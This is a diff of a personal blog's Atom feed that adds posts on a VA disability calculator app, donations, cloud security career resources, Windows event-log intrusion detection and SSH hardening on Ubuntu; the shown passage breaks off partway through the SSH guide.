@@ -1,186 +1,314 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="https://ianmf.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ianmf.com/" rel="alternate" type="text/html" /><updated>2024-12-20T18:08:50-05:00</updated><id>https://ianmf.com/feed.xml</id><title type="html">Ian Marrero’s Blog</title><subtitle>Ian Marrero&apos;s personal blog. </subtitle><author><name>Ian Marrero</name></author><entry><title type="html">Transitioning from WordPress to Jekyll on GitHub Pages</title><link href="https://ianmf.com/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages/" rel="alternate" type="text/html" title="Transitioning from WordPress to Jekyll on GitHub Pages" /><published>2024-02-09T10:17:00-05:00</published><updated>2024-02-09T10:17:00-05:00</updated><id>https://ianmf.com/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages</id><content type="html" xml:base="https://ianmf.com/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages/">&lt;p&gt;I recently embarked on a tech journey, moving my blog from WordPress hosted on a Digital Ocean droplet to using Jekyll on GitHub Pages. This wasn’t just a leap from one platform to another; it was a step towards simplification and efficiency after facing a significant hiccup.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-12-22T17:42:34-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">IanM.tech</title><subtitle>Ian Marrero&apos;s personal blog. </subtitle><author><name>Ian Marrero</name></author><entry><title type="html">Where Recent Donations Went During the Government Shutdown</title><link href="http://localhost:4000/2025/11/Where-Recent-Donations-Went-During-the-Government-Shutdown/" rel="alternate" type="text/html" title="Where Recent Donations Went During the Government Shutdown" /><published>2025-11-08T09:00:00-05:00</published><updated>2025-11-08T09:00:00-05:00</updated><id>http://localhost:4000/2025/11/Where-Recent-Donations-Went-During-the-Government-Shutdown</id><content type="html" xml:base="http://localhost:4000/2025/11/Where-Recent-Donations-Went-During-the-Government-Shutdown/"><![CDATA[<p>I’d like to thank everyone who chose to donate through my VA Disability Calculator app. During the recent government shutdown, those funds were used to purchase food items for a local shelter. All donations were matched dollar-for-dollar, converted directly into supplies, and delivered in person.</p>
 
-&lt;h3 id=&quot;the-original-setup-with-wordpress-and-digital-ocean&quot;&gt;The Original Setup with WordPress and Digital Ocean&lt;/h3&gt;
+<p>My kids assisted with the drop-off as a way to learn about community support and service. I’m sharing this to show where the support went and to highlight why local, direct aid matters during disruptions like this.</p>
 
-&lt;p&gt;Initially, my blog lived on WordPress, running on a Digital Ocean droplet. For those unfamiliar, WordPress is quite the powerhouse for website creation, offering a plethora of plugins and themes. My setup on a Digital Ocean droplet, a cloud-based virtual server, was pretty solid, with security updates and WordPress patches happening automatically. It was a robust setup, ensuring everything was up-to-date and secure without much manual intervention.&lt;/p&gt;
+<p><img src="/assets/images/2025/kids_donation_dropoff.png" alt="" /></p>
 
-&lt;h3 id=&quot;why-github-pages-and-jekyll-caught-my-eye&quot;&gt;Why GitHub Pages and Jekyll Caught My Eye&lt;/h3&gt;
+<blockquote class="notice">
+  <p><strong>Privacy note:</strong> Faces and identifying details have been intentionally obscured to protect privacy.</p>
+</blockquote>]]></content><author><name>Ian Marrero</name></author><category term="community" /><category term="veterans" /><category term="donations" /><category term="community" /><summary type="html"><![CDATA[I’d like to thank everyone who chose to donate through my VA Disability Calculator app. During the recent government shutdown, those funds were used to purchase food items for a local shelter. All donations were matched dollar-for-dollar, converted directly into supplies, and delivered in person.]]></summary></entry><entry><title type="html">VA Compensation Calculator iOS App — Update 1.26.0</title><link href="http://localhost:4000/2025/11/VA-Disability-Calculator-App-Update-1.26.0/" rel="alternate" type="text/html" title="VA Compensation Calculator iOS App — Update 1.26.0" /><published>2025-11-06T18:00:00-05:00</published><updated>2025-11-06T18:00:00-05:00</updated><id>http://localhost:4000/2025/11/VA-Disability-Calculator-App-Update-1.26.0</id><content type="html" xml:base="http://localhost:4000/2025/11/VA-Disability-Calculator-App-Update-1.26.0/"><![CDATA[<p>I’ve released an updated version of my <strong>VA Disability Calculator</strong> iOS app (version <strong>1.26.0</strong>).</p>
 
-&lt;p&gt;Then, I discovered GitHub Pages and Jekyll. GitHub Pages offers a straightforward approach to hosting websites directly from a GitHub repository, eliminating the complexity of databases and server management. Jekyll, a static site generator, transforms plain text into static websites and blogs. This combination promised a hassle-free hosting solution, focusing on content rather than maintenance.&lt;/p&gt;
+<p>This update improves handling of bilateral disabilities and adds support for the projected 2026 VA compensation pay tables. The new version has been released on the Apple App Store and is available for download now.</p>
 
-&lt;h3 id=&quot;the-catalyst-for-change-a-system-failure&quot;&gt;The Catalyst for Change: A System Failure&lt;/h3&gt;
+<p>You can find more details, screenshots, and ongoing updates on the dedicated project page:</p>
 
-&lt;p&gt;The motivation to switch was a system failure following a WordPress plugin update. My website suddenly became unresponsive, requiring a deep dive into troubleshooting. Considering the potential time sink, I opted for a simpler, more manageable solution.&lt;/p&gt;
+<p>📱 <strong><a href="/va-disability-calculator-ios-app/">VA Disability Calculator iOS App</a></strong></p>]]></content><author><name>Ian Marrero</name></author><category term="software" /><category term="resources" /><category term="veterans" /><category term="software" /><summary type="html"><![CDATA[I’ve released an updated version of my VA Disability Calculator iOS app (version 1.26.0).]]></summary></entry><entry><title type="html">VA Compensation Calculator iOS App Released!</title><link href="http://localhost:4000/2025/05/VA-Disability-Calculator-App-Release/" rel="alternate" type="text/html" title="VA Compensation Calculator iOS App Released!" /><published>2025-05-19T18:00:00-05:00</published><updated>2025-06-01T09:30:00-05:00</updated><id>http://localhost:4000/2025/05/VA-Disability-Calculator-App-Release</id><content type="html" xml:base="http://localhost:4000/2025/05/VA-Disability-Calculator-App-Release/"><![CDATA[<p>I’ve released my first iOS application: <strong>VA Compensation Calculator</strong>, a privacy-focused tool designed to help veterans calculate VA disability ratings and estimate monthly compensation.</p>
 
-&lt;h3 id=&quot;migrating-content-a-lesson-in-backups&quot;&gt;Migrating Content: A Lesson in Backups&lt;/h3&gt;
+<p>This app began as a personal tool during my own VA compensation journey. Many existing online calculators either don’t allow users to save their information or require re-entering data for every session. Others suffer from outdated or overly complex user interfaces. I wanted a tool that stored data locally, was easy to navigate, and worked entirely on-device.</p>
 
-&lt;p&gt;The migration was made possible by diligent backup practices. Using these backups, I was able to transfer my content to the new platform. This process highlighted the importance of regular backups and testing them to ensure they can be relied upon in emergencies.&lt;/p&gt;
+<p>After sharing the app with a few fellow veterans, the feedback was consistent: the layout was intuitive, the experience was straightforward, and it was something they wished had existed during their own VA process. That feedback motivated me to refine the app and release it publicly for the broader veteran community.</p>
 
-&lt;h3 id=&quot;a-new-beginning-on-github-pages&quot;&gt;A New Beginning on GitHub Pages&lt;/h3&gt;
+<p>This initial release includes a full VA compensation calculator that covers common VA rating rules and compensation categories. It implements everything I personally needed at the time. Future updates will be driven by veteran feedback, real-world use cases, and additional scenarios as they arise.</p>
 
-&lt;p&gt;To our visitors, welcome to the revamped blog. This migration signifies more than just a change of platforms; it represents a shift towards a more streamlined and focused blogging experience. Here’s to a future where we can share insights without the overhead of complex site management.&lt;/p&gt;
+<p>You can find more details, screenshots, and updates on the dedicated project page:</p>
 
-&lt;p&gt;Thank you for joining me on this new path.&lt;/p&gt;
+<p>📱 <strong><a href="/va-disability-calculator-ios-app/">VA Disability Calculator iOS App</a></strong></p>]]></content><author><name>Ian Marrero</name></author><category term="software" /><category term="resources" /><category term="veterans" /><category term="software" /><summary type="html"><![CDATA[I’ve released my first iOS application: VA Compensation Calculator, a privacy-focused tool designed to help veterans calculate VA disability ratings and estimate monthly compensation.]]></summary></entry><entry><title type="html">Cloud Security Engineer Resources</title><link href="http://localhost:4000/2024/05/Cloud-Security-Engineer-Resources/" rel="alternate" type="text/html" title="Cloud Security Engineer Resources" /><published>2024-05-30T17:05:00-05:00</published><updated>2024-05-30T17:05:00-05:00</updated><id>http://localhost:4000/2024/05/Cloud-Security-Engineer-Resources</id><content type="html" xml:base="http://localhost:4000/2024/05/Cloud-Security-Engineer-Resources/"><![CDATA[<h1 id="cloud-security-engineer-resources"><strong>Cloud Security Engineer Resources</strong></h1>
 
-&lt;p class=&quot;notice--info&quot;&gt;This post was generated using AI assistance.
-ChatGPT is amazing!&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Blog" /><category term="blog" /><summary type="html">I recently embarked on a tech journey, moving my blog from WordPress hosted on a Digital Ocean droplet to using Jekyll on GitHub Pages. This wasn’t just a leap from one platform to another; it was a step towards simplification and efficiency after facing a significant hiccup.</summary></entry><entry><title type="html">Detecting Unauthorized Intrusions Using Windows Security Event Logs</title><link href="https://ianmf.com/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs/" rel="alternate" type="text/html" title="Detecting Unauthorized Intrusions Using Windows Security Event Logs" /><published>2023-08-06T12:48:00-05:00</published><updated>2023-08-06T12:48:00-05:00</updated><id>https://ianmf.com/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs</id><content type="html" xml:base="https://ianmf.com/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs/">&lt;p&gt;Maintaining the security of a Windows system is essential to protect sensitive data and prevent unauthorized access. One powerful tool in detecting potential security breaches is the Windows Security Event Logs. These logs provide valuable information about system activities, user actions, and potential intrusion attempts. In this article, we will explore how to leverage Windows Security Event Logs, focusing on specific Event IDs to monitor for unauthorized intrusions effectively.&lt;/p&gt;
+<h2 id="my-path"><strong>My Path</strong></h2>
 
-&lt;ol&gt;
-  &lt;li&gt;Understanding Windows Security Event Logs:&lt;br /&gt;
-Windows Security Event Logs record significant security-related events on the system. There are three main types of logs:&lt;br /&gt;
-a. Security: Records authentication events, such as logon attempts, account management changes, and permission modifications.&lt;br /&gt;
-b. Application: Logs events from applications and services, which can include potential indicators of malicious activities.&lt;br /&gt;
-c. System: Captures system-level events, such as device driver failures and system startup/shutdown.&lt;/li&gt;
-  &lt;li&gt;Enabling and Configuring Security Event Logs:&lt;br /&gt;
-By default, Windows logs important security events. However, it’s crucial to ensure that the necessary logs are enabled and configured for your specific security needs. To access Event Viewer and manage logs:&lt;br /&gt;
-a. Press Win + X, then select “Event Viewer” from the menu.&lt;br /&gt;
-b. In the left pane, navigate to “Windows Logs” and select “Security.”&lt;br /&gt;
-c. Right-click on “Security” and choose “Properties” to configure the log settings.&lt;br /&gt;
-d. Define the log size, retention method, and event log overwrite behavior.&lt;/li&gt;
-  &lt;li&gt;Identifying Suspicious Activities - Event IDs to Monitor:&lt;br /&gt;
-To detect unauthorized intrusions, focus on specific Event IDs that might indicate potential security breaches:&lt;br /&gt;
-a. Multiple Failed Logon Attempts (Event ID 4625): Watch for Event ID 4625, which records failed logon attempts. A series of failed logon attempts could indicate a brute force attack or password guessing.&lt;br /&gt;
-b. Account Lockouts (Event ID 4740): Monitor Event ID 4740, which logs account lockout events. Frequent account lockouts may suggest unauthorized access attempts.&lt;br /&gt;
-c. Privilege Escalation (Event ID 4732, 4733, 4756): Keep an eye on Event IDs related to changes in user permissions or group memberships, such as 4732 (User added to a group), 4733 (User removed from a group), and 4756 (User added to a privileged group). Attackers might attempt to gain higher privileges.&lt;br /&gt;
-d. Suspicious IP Addresses (Event ID 4624): Track logon events (Event ID 4624) with unusual or foreign IP addresses, which could indicate unauthorized access.&lt;/li&gt;
-  &lt;li&gt;Creating Custom Event Log Subscriptions:&lt;br /&gt;
-Windows allows you to create custom event log subscriptions to forward specific events to a central server for analysis. This approach enhances real-time monitoring and provides a centralized view of security events across multiple systems.&lt;/li&gt;
-  &lt;li&gt;Leveraging Windows PowerShell:&lt;br /&gt;
-Windows PowerShell is a powerful scripting tool that can help automate log analysis and intrusion detection. PowerShell scripts can be designed to trigger alerts based on specific Event IDs or patterns in the security logs.&lt;/li&gt;
-  &lt;li&gt;Integrating with Security Information and Event Management (SIEM) Solutions:&lt;br /&gt;
-For a comprehensive approach to intrusion detection, consider integrating Windows Security Event Logs with SIEM solutions. SIEM tools aggregate and analyze log data from various sources, offering a more comprehensive view of security events and potential threats.&lt;/li&gt;
-&lt;/ol&gt;
+<p>Help Desk &gt; Sysadmin &gt; IR/TH &gt; Cyber Engineering &gt; Cloud Security</p>
 
-&lt;p&gt;Windows Security Event Logs are invaluable in detecting unauthorized intrusions and protecting your system from potential security breaches. By properly configuring and monitoring these logs, IT administrators and security professionals can gain crucial insights into system activities and user actions. Implementing real-time monitoring, custom log subscriptions, PowerShell scripts, and SIEM integration, while focusing on specific Event IDs, can significantly enhance your ability to detect and respond to security incidents effectively. Regularly review logs, update security policies, and stay informed about emerging threats to maintain a secure Windows environment.&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Windows" /><category term="cybersecurity" /><category term="windows" /><category term="eventlog" /><summary type="html">Maintaining the security of a Windows system is essential to protect sensitive data and prevent unauthorized access. One powerful tool in detecting potential security breaches is the Windows Security Event Logs. These logs provide valuable information about system activities, user actions, and potential intrusion attempts. In this article, we will explore how to leverage Windows Security Event Logs, focusing on specific Event IDs to monitor for unauthorized intrusions effectively.</summary></entry><entry><title type="html">A Comprehensive Guide to Securing SSH on Ubuntu 22.04</title><link href="https://ianmf.com/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04/" rel="alternate" type="text/html" title="A Comprehensive Guide to Securing SSH on Ubuntu 22.04" /><published>2023-07-23T11:16:00-05:00</published><updated>2023-07-23T11:16:00-05:00</updated><id>https://ianmf.com/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04</id><content type="html" xml:base="https://ianmf.com/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04/">&lt;p&gt;SSH (Secure Shell) is a widely used protocol for securely accessing remote servers. However, its popularity also makes it a target for potential attackers. To ensure the safety of your Ubuntu 22.04 server, it is crucial to implement robust security measures for SSH. In this article, we will discuss essential steps to secure SSH on Ubuntu 22.04, safeguarding your server from unauthorized access and potential security breaches.&lt;/p&gt;
+<h2 id="certifications"><strong>Certifications</strong></h2>
 
-&lt;ol&gt;
-  &lt;li&gt;Update and Upgrade:&lt;br /&gt;
-Before diving into SSH security configurations, ensure your Ubuntu system is up-to-date. Use the following commands to update the package list and upgrade installed packages:&lt;/li&gt;
-&lt;/ol&gt;
+<ul>
+  <li>
+    <p>Microsoft Cyber Security Architect - Azure  <a href="https://learn.microsoft.com/en-us/credentials/certifications/exams/sc-100/">Link</a></p>
+  </li>
+  <li>
+    <p>AWS Certified Solutions Architect - Professional  <a href="https://aws.amazon.com/certification/certified-solutions-architect-professional/">Link</a></p>
+  </li>
+</ul>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt update
+<p>Google Cloud is not highly adopted like its counterparts. Skipping for now.</p>
+
+<h2 id="training"><strong>Training</strong></h2>
+
+<ul>
+  <li>
+    <p>RHSA</p>
+  </li>
+  <li>
+    <p>RHCE </p>
+  </li>
+  <li>
+    <p>Ansible Bootcamp  <a href="https://www.udemy.com/course/diveintoansible/">Link</a></p>
+  </li>
+  <li>
+    <p>Python 100 Days of Code  <a href="https://www.udemy.com/course/100-days-of-code/">Link</a></p>
+  </li>
+</ul>
+
+<p>Red Hat certifications require constantly testing for renewal. Probably not necessary to obtain but training would be worth it.</p>
+
+<h2 id="homelab-projects"><strong>Homelab /Projects</strong></h2>
+
+<ul>
+  <li>
+    <p>Pwnlabs.io Labs  <a href="https://pwnedlabs.io/">Link</a></p>
+  </li>
+  <li>
+    <p>A Cloud Guru Labs   <a href="https://www.pluralsight.com/cloud-guru/pricing">Link</a></p>
+  </li>
+</ul>
+
+<p>Need to research both platforms; will pick the most relevant one to my personal career path.</p>
+
+<h2 id="communities"><strong>Communities</strong></h2>
+
+<ul>
+  <li>Cloud Security Office Hour (CSOH)    <a href="https://www.cloudsecurityofficehours.com/home">Link</a>      <a href="https://discord.gg/rjFFwv3w6f">Discord Link</a></li>
+</ul>
+
+<h2 id="mailing-lists"><strong>Mailing Lists</strong></h2>
+
+<ul>
+  <li>
+    <p>TL;DR sec.  <a href="https://tldrsec.com/">Link</a></p>
+  </li>
+  <li>
+    <p>CloudSecList   <a href="https://cloudseclist.com/">Link</a></p>
+  </li>
+</ul>
+
+<h2 id="books"><strong>Books</strong></h2>
+
+<ul>
+  <li>The Phoenix Project: A Novel about IT, DevOps, and Helping Your Business Win   <a href="https://www.amazon.com/gp/product/0988262592">Amazon Link</a></li>
+</ul>
+
+<h2 id="podcasts"><strong>Podcasts</strong></h2>
+
+<ul>
+  <li>TODO</li>
+</ul>
+
+<h2 id="resources"><strong>Resources</strong></h2>
+
+<ul>
+  <li>
+    <p>Certification and Career Map <a href="https://pauljerimy.com/security-certification-roadmap/">Link</a></p>
+  </li>
+  <li>
+    <p>RHCSA 9 Lab Github Repo  <a href="https://github.com/aggressiveHiker/rhcsa9/">Link</a></p>
+  </li>
+  <li>
+    <p>Another RHCSA Lab Setup Notes  <a href="https://www.computernetworkingnotes.com/linux-tutorials/rhce-practice-lab-setup-in-vmware-and-in-virtualbox.html">Link</a></p>
+  </li>
+  <li>
+    <p>AWS Learning Path from AWS <a href="https://d1.awsstatic.com/training-and-certification/docs/AWS_certification_paths.pdf">Link PDF</a></p>
+  </li>
+  <li>
+    <p>Breaking Into Cloud Cyber Security Blog  <a href="https://www.nojones.net/posts/breaking-into-cloudsec">Link</a></p>
+  </li>
+  <li>
+    <p>The Extended AWS Security Ramp-Up Guide   <a href="https://www.nccgroup.com/us/research-blog/the-extended-aws-security-ramp-up-guide/">Link</a></p>
+  </li>
+  <li>
+    <p>r/cybersecurity   <a href="https://www.reddit.com/r/cybersecurity/">Link</a></p>
+  </li>
+</ul>]]></content><author><name>Ian Marrero</name></author><category term="cybersecurity" /><category term="resources" /><category term="career" /><category term="training" /><summary type="html"><![CDATA[Cloud Security Engineer Resources]]></summary></entry><entry><title type="html">Transitioning from WordPress to Jekyll on GitHub Pages</title><link href="http://localhost:4000/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages/" rel="alternate" type="text/html" title="Transitioning from WordPress to Jekyll on GitHub Pages" /><published>2024-02-09T10:17:00-05:00</published><updated>2024-02-09T10:17:00-05:00</updated><id>http://localhost:4000/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages</id><content type="html" xml:base="http://localhost:4000/2024/02/Transitioning-from-WordPress-to-Jekyll-on-GitHub-Pages/"><![CDATA[<p>I recently embarked on a tech journey, moving my blog from WordPress hosted on a Digital Ocean droplet to using Jekyll on GitHub Pages. This wasn’t just a leap from one platform to another; it was a step towards simplification and efficiency after facing a significant hiccup.</p>
+
+<h3 id="the-original-setup-with-wordpress-and-digital-ocean">The Original Setup with WordPress and Digital Ocean</h3>
+
+<p>Initially, my blog lived on WordPress, running on a Digital Ocean droplet. For those unfamiliar, WordPress is quite the powerhouse for website creation, offering a plethora of plugins and themes. My setup on a Digital Ocean droplet, a cloud-based virtual server, was pretty solid, with security updates and WordPress patches happening automatically. It was a robust setup, ensuring everything was up-to-date and secure without much manual intervention.</p>
+
+<h3 id="why-github-pages-and-jekyll-caught-my-eye">Why GitHub Pages and Jekyll Caught My Eye</h3>
+
+<p>Then, I discovered GitHub Pages and Jekyll. GitHub Pages offers a straightforward approach to hosting websites directly from a GitHub repository, eliminating the complexity of databases and server management. Jekyll, a static site generator, transforms plain text into static websites and blogs. This combination promised a hassle-free hosting solution, focusing on content rather than maintenance.</p>
+
+<h3 id="the-catalyst-for-change-a-system-failure">The Catalyst for Change: A System Failure</h3>
+
+<p>The motivation to switch was a system failure following a WordPress plugin update. My website suddenly became unresponsive, requiring a deep dive into troubleshooting. Considering the potential time sink, I opted for a simpler, more manageable solution.</p>
+
+<h3 id="migrating-content-a-lesson-in-backups">Migrating Content: A Lesson in Backups</h3>
+
+<p>The migration was made possible by diligent backup practices. Using these backups, I was able to transfer my content to the new platform. This process highlighted the importance of regular backups and testing them to ensure they can be relied upon in emergencies.</p>
+
+<h3 id="a-new-beginning-on-github-pages">A New Beginning on GitHub Pages</h3>
+
+<p>To our visitors, welcome to the revamped blog. This migration signifies more than just a change of platforms; it represents a shift towards a more streamlined and focused blogging experience. Here’s to a future where we can share insights without the overhead of complex site management.</p>
+
+<p>Thank you for joining me on this new path.</p>
+
+<p class="notice--info">This post was generated using AI assistance.
+ChatGPT is amazing!</p>]]></content><author><name>Ian Marrero</name></author><category term="Blog" /><category term="blog" /><summary type="html"><![CDATA[I recently embarked on a tech journey, moving my blog from WordPress hosted on a Digital Ocean droplet to using Jekyll on GitHub Pages. This wasn’t just a leap from one platform to another; it was a step towards simplification and efficiency after facing a significant hiccup.]]></summary></entry><entry><title type="html">Detecting Unauthorized Intrusions Using Windows Security Event Logs</title><link href="http://localhost:4000/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs/" rel="alternate" type="text/html" title="Detecting Unauthorized Intrusions Using Windows Security Event Logs" /><published>2023-08-06T12:48:00-05:00</published><updated>2023-08-06T12:48:00-05:00</updated><id>http://localhost:4000/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs</id><content type="html" xml:base="http://localhost:4000/2023/08/Detecting-Unauthorized-Intrusions-Using-Windows-Security-Event-Logs/"><![CDATA[<p>Maintaining the security of a Windows system is essential to protect sensitive data and prevent unauthorized access. One powerful tool in detecting potential security breaches is the Windows Security Event Logs. These logs provide valuable information about system activities, user actions, and potential intrusion attempts. In this article, we will explore how to leverage Windows Security Event Logs, focusing on specific Event IDs to monitor for unauthorized intrusions effectively.</p>
+
+<ol>
+  <li>Understanding Windows Security Event Logs:<br />
+Windows Security Event Logs record significant security-related events on the system. There are three main types of logs:<br />
+a. Security: Records authentication events, such as logon attempts, account management changes, and permission modifications.<br />
+b. Application: Logs events from applications and services, which can include potential indicators of malicious activities.<br />
+c. System: Captures system-level events, such as device driver failures and system startup/shutdown.</li>
+  <li>Enabling and Configuring Security Event Logs:<br />
+By default, Windows logs important security events. However, it’s crucial to ensure that the necessary logs are enabled and configured for your specific security needs. To access Event Viewer and manage logs:<br />
+a. Press Win + X, then select “Event Viewer” from the menu.<br />
+b. In the left pane, navigate to “Windows Logs” and select “Security.”<br />
+c. Right-click on “Security” and choose “Properties” to configure the log settings.<br />
+d. Define the log size, retention method, and event log overwrite behavior.</li>
+  <li>Identifying Suspicious Activities - Event IDs to Monitor:<br />
+To detect unauthorized intrusions, focus on specific Event IDs that might indicate potential security breaches:<br />
+a. Multiple Failed Logon Attempts (Event ID 4625): Watch for Event ID 4625, which records failed logon attempts. A series of failed logon attempts could indicate a brute force attack or password guessing.<br />
+b. Account Lockouts (Event ID 4740): Monitor Event ID 4740, which logs account lockout events. Frequent account lockouts may suggest unauthorized access attempts.<br />
+c. Privilege Escalation (Event ID 4732, 4733, 4756): Keep an eye on Event IDs related to changes in user permissions or group memberships, such as 4732 (User added to a group), 4733 (User removed from a group), and 4756 (User added to a privileged group). Attackers might attempt to gain higher privileges.<br />
+d. Suspicious IP Addresses (Event ID 4624): Track logon events (Event ID 4624) with unusual or foreign IP addresses, which could indicate unauthorized access.</li>
+  <li>Creating Custom Event Log Subscriptions:<br />
+Windows allows you to create custom event log subscriptions to forward specific events to a central server for analysis. This approach enhances real-time monitoring and provides a centralized view of security events across multiple systems.</li>
+  <li>Leveraging Windows PowerShell:<br />
+Windows PowerShell is a powerful scripting tool that can help automate log analysis and intrusion detection. PowerShell scripts can be designed to trigger alerts based on specific Event IDs or patterns in the security logs.</li>
+  <li>Integrating with Security Information and Event Management (SIEM) Solutions:<br />
+For a comprehensive approach to intrusion detection, consider integrating Windows Security Event Logs with SIEM solutions. SIEM tools aggregate and analyze log data from various sources, offering a more comprehensive view of security events and potential threats.</li>
+</ol>
+
+<p>Windows Security Event Logs are invaluable in detecting unauthorized intrusions and protecting your system from potential security breaches. By properly configuring and monitoring these logs, IT administrators and security professionals can gain crucial insights into system activities and user actions. Implementing real-time monitoring, custom log subscriptions, PowerShell scripts, and SIEM integration, while focusing on specific Event IDs, can significantly enhance your ability to detect and respond to security incidents effectively. Regularly review logs, update security policies, and stay informed about emerging threats to maintain a secure Windows environment.</p>]]></content><author><name>Ian Marrero</name></author><category term="Windows" /><category term="cybersecurity" /><category term="windows" /><category term="eventlog" /><summary type="html"><![CDATA[Maintaining the security of a Windows system is essential to protect sensitive data and prevent unauthorized access. One powerful tool in detecting potential security breaches is the Windows Security Event Logs. These logs provide valuable information about system activities, user actions, and potential intrusion attempts. In this article, we will explore how to leverage Windows Security Event Logs, focusing on specific Event IDs to monitor for unauthorized intrusions effectively.]]></summary></entry><entry><title type="html">A Comprehensive Guide to Securing SSH on Ubuntu 22.04</title><link href="http://localhost:4000/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04/" rel="alternate" type="text/html" title="A Comprehensive Guide to Securing SSH on Ubuntu 22.04" /><published>2023-07-23T11:16:00-05:00</published><updated>2023-07-23T11:16:00-05:00</updated><id>http://localhost:4000/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04</id><content type="html" xml:base="http://localhost:4000/2023/07/A-Comprehensive-Guide-to-Securing-SSH-on-Ubuntu-22-04/"><![CDATA[<p>SSH (Secure Shell) is a widely used protocol for securely accessing remote servers. However, its popularity also makes it a target for potential attackers. To ensure the safety of your Ubuntu 22.04 server, it is crucial to implement robust security measures for SSH. In this article, we will discuss essential steps to secure SSH on Ubuntu 22.04, safeguarding your server from unauthorized access and potential security breaches.</p>
+
+<ol>
+  <li>Update and Upgrade:<br />
+Before diving into SSH security configurations, ensure your Ubuntu system is up-to-date. Use the following commands to update the package list and upgrade installed packages:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt update
 sudo apt upgrade
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
 
-&lt;ol&gt;
-  &lt;li&gt;Disable Root Login:&lt;br /&gt;
-By default, SSH allows the root user to log in directly. Disable this to minimize the risk of brute force attacks. Edit the SSH configuration file using a text editor like nano or vim:&lt;/li&gt;
-&lt;/ol&gt;
+<ol>
+  <li>Disable Root Login:<br />
+By default, SSH allows the root user to log in directly. Disable this to minimize the risk of brute force attacks. Edit the SSH configuration file using a text editor like nano or vim:</li>
+</ol>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/ssh/sshd_config
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano /etc/ssh/sshd_config
+</code></pre></div></div>
 
-&lt;p&gt;Locate the line containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PermitRootLogin&lt;/code&gt; and set it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no&lt;/code&gt;:&lt;/p&gt;
+<p>Locate the line containing <code class="language-plaintext highlighter-rouge">PermitRootLogin</code> and set it to <code class="language-plaintext highlighter-rouge">no</code>:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PermitRootLogin no
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PermitRootLogin no
+</code></pre></div></div>
 
-&lt;p&gt;Save the file and restart the SSH service:&lt;/p&gt;
+<p>Save the file and restart the SSH service:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service ssh restart
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service ssh restart
+</code></pre></div></div>
 
-&lt;ol&gt;
-  &lt;li&gt;Use SSH Key Authentication:&lt;br /&gt;
-Instead of relying on passwords, implement SSH key authentication for increased security. Generate an SSH key pair on your local machine:&lt;/li&gt;
-&lt;/ol&gt;
+<ol>
+  <li>Use SSH Key Authentication:<br />
+Instead of relying on passwords, implement SSH key authentication for increased security. Generate an SSH key pair on your local machine:</li>
+</ol>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen
+</code></pre></div></div>
 
-&lt;p&gt;Copy the public key to the remote server using ssh-copy-id:&lt;/p&gt;
+<p>Copy the public key to the remote server using ssh-copy-id:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-copy-id user@your_server_ip
